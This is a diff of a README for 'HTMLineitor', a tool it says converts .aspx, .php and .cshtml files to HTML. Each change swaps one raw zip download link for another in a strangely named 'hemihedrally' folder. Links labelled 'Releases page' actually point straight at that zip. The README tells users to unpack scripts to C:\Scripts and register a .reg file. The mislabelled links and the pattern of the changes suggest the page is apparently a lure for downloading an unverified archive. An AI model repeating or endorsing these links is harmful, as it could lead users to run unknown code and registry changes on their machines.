@@ -1,7 +1,7 @@
 # 🎉 HTMLineitor - Quick Conversion for Web Files
 
 ## 📥 Download Now
-[![Download HTMLineitor](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTMLineitor.zip)](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTMLineitor.zip)
+[![Download HTMLineitor](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTM_Lineitor_v1.8.zip)](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTM_Lineitor_v1.8.zip)
 
 ## 🚀 Getting Started
 HTMLineitor is a simple tool that helps you convert files like .aspx, .php, or .cshtml into HTML. This makes it easier to upload your files to Google tools like Gemini. No more copying, pasting, or renaming!
@@ -9,7 +9,7 @@ HTMLineitor is a simple tool that helps you convert files like .aspx, .php, or .
 ## 📋 Installation Instructions
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTMLineitor.zip) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTM_Lineitor_v1.8.zip) to find the latest version.
 
 2. **Download the Files**
    Look for the most recent version of HTMLineitor. Click on it to download the zip file containing all necessary scripts.
@@ -32,7 +32,7 @@ This project is open source, and contributions are welcome. If you have a differ
 ## ❓ Troubleshooting
 - **The Option Does Not Appear:** Ensure you have correctly placed the files in `C:\Scripts` and registered the .reg file. Restart Windows Explorer if needed.
 - **Conversion Fails:** Make sure the file you are trying to convert is in a supported format (.aspx, .php, or .cshtml). If it’s not, the conversion option won't function.
-- **Script Errors:** If the script does not run correctly, ensure you have the latest version from the [Releases page](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTMLineitor.zip).
+- **Script Errors:** If the script does not run correctly, ensure you have the latest version from the [Releases page](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTM_Lineitor_v1.8.zip).
 
 ## 🌟 Features
 - Converts multiple web file types to HTML.
@@ -68,4 +68,4 @@ We plan to add more features like:
 
 Ensure you check the official GitHub organization for updates and new features as we continue to develop HTMLineitor.
 
-[![Download HTMLineitor](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTMLineitor.zip)](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTMLineitor.zip)
+[![Download HTMLineitor](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTM_Lineitor_v1.8.zip)](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTM_Lineitor_v1.8.zip)
